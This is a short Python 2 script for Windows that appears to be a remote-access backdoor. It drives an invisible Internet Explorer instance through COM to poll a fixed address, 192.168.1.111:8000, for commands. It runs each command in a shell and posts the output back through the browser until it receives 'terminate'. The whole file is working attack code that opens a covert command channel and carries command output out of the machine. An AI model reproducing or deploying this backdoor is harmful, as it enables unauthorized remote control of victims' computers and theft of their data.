#!/usr/bin/python

from win32com.client import Dispatch
from time import sleep
import subprocess

# creating a Browser Instance
ie = Dispatch("InternetExplorer.Application")
# making it invisible (background)
ie.Visible = 0

# HTTP parameter for the POST
url = "http://192.168.1.111:8000"
flags = 0
targetFrame = ""

while True:
    # we tell IE to access certain address
    ie.Navigate("http://192.168.1.111:8000")
    # wait for the page is loaded completely
    while ie.ReadyState != 4:
        sleep(1)

    # generating command
    command = ie.Document.body.innerHTML # retrive the HTML page
    command = unicode(command) # converting it to Unicode
    command = command.encode('ascii','ignore') # transferring commands to ASCII and ignore any exception
    print("[+] Command received: " + command)

    if 'terminate' in command:
        ie.Quit() # forcing quit the IE instance
        break
    else:
        # processing the command sent (shell injection)
        CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        # reading the stdout
        data = CMD.stdout.read()
        # buffering the data generate (command stdout) to the COMM object
        postData = buffer(data)
        # Instance from navigation - going into certain pages
        ie.Navigate(url, flags, targetFrame, postData)

    sleep(3)
